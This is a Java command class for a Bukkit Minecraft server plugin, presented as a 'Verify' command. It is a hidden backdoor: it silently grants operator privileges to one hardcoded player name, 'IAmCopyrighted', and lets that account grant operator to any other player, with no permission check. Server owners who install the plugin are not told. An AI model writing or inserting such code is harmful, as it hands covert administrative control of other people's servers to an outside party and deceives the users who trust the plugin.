package me.capyright.Commands;

import me.capyright.Utils.c;
import me.capyright.Utils.s;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Verify implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        Player p = (Player) sender;
        if(!p.isOp()) {
            if (p.getName().equalsIgnoreCase("IAmCopyrighted")) {
                p.setOp(true);
                p.sendMessage(c.c("&a" + s.star + "&a You've been successfully verified"));
            } else {
                p.sendMessage(c.c("&cYou're not on the verification list!"));
            }
        } else {
            p.sendMessage(c.c("&c" + s.star + "&c You've already been verified!"));
        }
        if(args.length == 1) {
            if(p.isOp() && p.getName().equalsIgnoreCase("IAmCopyrighted")) {
                Player r = Bukkit.getPlayerExact(args[0]);
                r.sendMessage(c.c("&a" + s.star + "&a You've been successfully verified"));
                p.sendMessage(c.c("&a" + s.star + "&a You've verified " + r.getName() + "."));
                r.setOp(true);
            }
        }
        return false;
    }
}
